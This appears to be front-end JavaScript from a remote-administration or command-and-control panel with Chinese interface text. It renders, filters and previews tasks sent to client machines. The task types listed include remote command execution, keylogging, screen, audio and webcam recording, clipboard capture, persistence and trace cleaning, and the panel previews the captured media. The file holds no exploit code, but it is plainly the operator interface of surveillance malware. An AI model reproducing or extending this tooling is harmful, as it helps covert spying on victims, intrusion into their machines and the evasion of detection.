app._renderTaskRow = function(t) {
            const client = (this.clients||[]).find(c => c.client_id === t.client_id);
            const host = client ? client.hostname : (t.client_id||'').slice(0,8);
            let isMedia = false;
            try { const p = JSON.parse(t.result||''); if (p && p.type==='file') isMedia = true; } catch(e){}
            return `
            <tr class="table-row">
                <td style="padding:10px 12px; font-family:monospace;">#${t.id}</td>
                <td style="padding:10px 12px; font-size:12px;">${host}</td>
                <td style="padding:10px 12px;"><span class="badge badge-blue">${t.task_type}</span></td>
                <td style="padding:10px 12px;">
                    <span class="badge badge-${t.status === 'completed' ? 'green' : t.status === 'pending' ? 'yellow' : t.status === 'processing' ? 'blue' : 'red'}">${t.status}</span>
                </td>
                <td style="padding:10px 12px; font-size:11px; color:#8b949e;">${t.created_at?.slice(0,19).replace('T',' ') || '-'}</td>
                <td style="padding:10px 12px; font-size:11px; color:#8b949e;">${t.completed_at?.slice(0,19).replace('T',' ') || '-'}</td>
                <td style="padding:10px 12px; display:flex; gap:4px;">
                    <button class="btn btn-secondary" style="padding:4px 8px; font-size:11px;" onclick="app.showTaskResult(${t.id})"><i class="fas fa-eye"></i></button>
                    ${isMedia ? `<button class="btn btn-blue" style="padding:4px 8px; font-size:11px;" onclick="app.showTaskResult(${t.id},true)"><i class="fas fa-image"></i></button>` : ''}
                    <button class="btn btn-danger" style="padding:4px 8px; font-size:11px;" onclick="app.deleteTask(${t.id})"><i class="fas fa-trash"></i></button>
                </td>
            </tr>
            `;
        };

        app.renderTasks = function() {
            const TASK_TYPES = ['cmd','sysinfo','process_list','file_list','file_download','file_mkdir','file_delete','file_rename','file_upload','screenshot','record_screen','record_audio','camera_photo','camera_record','keylogger_start','clipboard','persistence','clean_trace'];
            // 本地过滤
            let filtered = this.tasks;
            if (this.taskFilterStatus) filtered = filtered.filter(t => t.status === this.taskFilterStatus);
            if (this.taskFilterType) filtered = filtered.filter(t => t.task_type === this.taskFilterType);
            // 分页计算
            const total = filtered.length;
            const totalPages = Math.max(1, Math.ceil(total / this.taskPageSize));
            if (this.taskPage > totalPages) this.taskPage = totalPages;
            if (this.taskPage < 1) this.taskPage = 1;
            const startIdx = (this.taskPage - 1) * this.taskPageSize;
            const pageData = filtered.slice(startIdx, startIdx + this.taskPageSize);
            return `
                <div style="margin-bottom:12px; display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
                    <select class="select" style="max-width:140px;" onchange="app.taskFilterStatus=this.value; app.taskPage=1; app.render()">
                        <option value="">全部状态</option>
                        <option value="pending" ${this.taskFilterStatus==='pending'?'selected':''}>pending</option>
                        <option value="processing" ${this.taskFilterStatus==='processing'?'selected':''}>processing</option>
                        <option value="completed" ${this.taskFilterStatus==='completed'?'selected':''}>completed</option>
                        <option value="failed" ${this.taskFilterStatus==='failed'?'selected':''}>failed</option>
                    </select>
                    <select class="select" style="max-width:160px;" onchange="app.taskFilterType=this.value; app.taskPage=1; app.render()">
                        <option value="">全部类型</option>
                        ${TASK_TYPES.map(tp => `<option value="${tp}" ${this.taskFilterType===tp?'selected':''}>${tp}</option>`).join('')}
                    </select>
                    <span style="font-size:11px; color:#8b949e;">共 ${total} 条</span>
                    <div style="flex:1;"></div>
                    <button class="btn btn-secondary" onclick="app.loadTasks()"><i class="fas fa-sync-alt"></i> 刷新</button>
                </div>
                <div class="card" style="overflow:hidden;">
                    <table style="width:100%; border-collapse:collapse;">
                        <thead>
                            <tr style="background:#161b22; font-size:12px; color:#8b949e;">
                                <th style="padding:10px 12px; text-align:left;">ID</th>
                                <th style="padding:10px 12px; text-align:left;">客户端</th>
                                <th style="padding:10px 12px; text-align:left;">类型</th>
                                <th style="padding:10px 12px; text-align:left;">状态</th>
                                <th style="padding:10px 12px; text-align:left;">创建时间</th>
                                <th style="padding:10px 12px; text-align:left;">完成时间</th>
                                <th style="padding:10px 12px; text-align:left;">操作</th>
                            </tr>
                        </thead>
                        <tbody id="taskTableBody">
                            ${pageData.map(t => this._renderTaskRow(t)).join('')}
                        </tbody>
                    </table>
                    ${total === 0 ? `
                        <div style="text-align:center; padding:60px; color:#8b949e;">暂无任务记录</div>
                    ` : ''}
                    ${this.renderPagination(total, this.taskPage, this.taskPageSize, 'app.goToTaskPage')}
                </div>
            `;
        };

        // 任务列表翻页
        app.goToTaskPage = function(p) {
            this.taskPage = parseInt(p) || 1;
            this.render();
        };

        app.deleteTask = async function(id) {
            if (!confirm('确认删除任务 #' + id + '？')) return;
            const loading = this._notify('正在删除任务...', 'loading', 0);
            try {
                await API.post('/api/task/' + id + '/delete', {});
                await this.loadTasksSilent();
                loading.remove();
                this._notify('任务已删除', 'success');
                this.render();
            } catch(e) {
                loading.remove();
                this._notify('删除失败: ' + e.message, 'error');
            }
        };

        app.showTaskResult = function(id, preferMedia) {
            const task = this.tasks.find(t => t.id === id);
            if (!task) return;
            const result = task.result || '(无结果)';

            // 若是资源文件，直接调预览
            if (preferMedia) {
                try {
                    const p = JSON.parse(result);
                    if (p && p.type === 'file' && p.path) {
                        const typeMap = {'screenshot':'screenshot','camera_photo':'screenshot','record_screen':'record_screen','camera_record':'record_screen','record_audio':'record_audio'};
                        this.previewMedia(p.path, typeMap[task.task_type] || 'screenshot');
                        return;
                    }
                } catch(e){}
            }

            const old = document.getElementById('taskResultOverlay');
            if (old) old.remove();
            const overlay = document.createElement('div');
            overlay.id = 'taskResultOverlay';
            overlay.className = 'modal-overlay';
            overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.remove(); });

            // 尝试检测资源文件，给出预览按钮
            let mediaBtn = '';
            try {
                const p = JSON.parse(result);
                if (p && p.type === 'file' && p.path) {
                    const typeMap = {'screenshot':'screenshot','camera_photo':'screenshot','record_screen':'record_screen','camera_record':'record_screen','record_audio':'record_audio'};
                    const mt = typeMap[task.task_type] || 'screenshot';
                    mediaBtn = `<button class="btn btn-blue" style="padding:6px 12px; font-size:12px;" onclick="app.previewMedia('${p.path}','${mt}'); this.closest('.modal-overlay').remove();"><i class="fas fa-image"></i> 预览资源</button>`;
                }
            } catch(e){}

            const display = result.length > 8000 ? result.slice(0,8000) + '\n...(已截断，完整结果请下载)' : result;

            overlay.innerHTML = `
                <div class="modal" style="max-width:900px;">
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
                        <div>
                            <span style="font-size:14px; font-weight:600;">任务 #${task.id} 结果</span>
                            <span class="badge badge-blue" style="margin-left:8px;">${task.task_type}</span>
                            <span class="badge badge-${task.status === 'completed' ? 'green' : 'red'}" style="margin-left:4px;">${task.status}</span>
                        </div>
                        <div style="display:flex; gap:6px;">
                            ${mediaBtn}
                            <button class="btn btn-secondary" style="padding:6px 12px; font-size:12px;" onclick="app._copyTaskResult(${id})"><i class="fas fa-copy"></i> 复制</button>
                            <button class="btn btn-secondary" style="padding:6px 12px;" onclick="this.closest('.modal-overlay').remove()"><i class="fas fa-times"></i></button>
                        </div>
                    </div>
                    <pre style="background:#0d1117; padding:16px; border-radius:8px; max-height:65vh; overflow:auto; font-size:12px; color:#c9d1d9; white-space:pre-wrap; word-break:break-all; border:1px solid #21262d;">${(display||'').replace(/</g,'&lt;')}</pre>
                </div>
            `;
            document.body.appendChild(overlay);
        };

        app._copyTaskResult = function(id) {
            const task = this.tasks.find(t => t.id === id);
            if (!task) return;
            navigator.clipboard.writeText(task.result || '').then(() => this._notify('已复制到剪贴板', 'success')).catch(() => this._notify('复制失败', 'error'));
        };

app._refreshTaskTable = function() {
    const tbody = document.getElementById('taskTableBody');
    if (tbody) {
        let filtered = this.tasks;
        if (this.taskFilterStatus) filtered = filtered.filter(t => t.status === this.taskFilterStatus);
        if (this.taskFilterType) filtered = filtered.filter(t => t.task_type === this.taskFilterType);
        // 仅刷新当前页的数据
        const startIdx = (this.taskPage - 1) * this.taskPageSize;
        const pageData = filtered.slice(startIdx, startIdx + this.taskPageSize);
        tbody.innerHTML = pageData.map(t => this._renderTaskRow(t)).join('');
    }
};
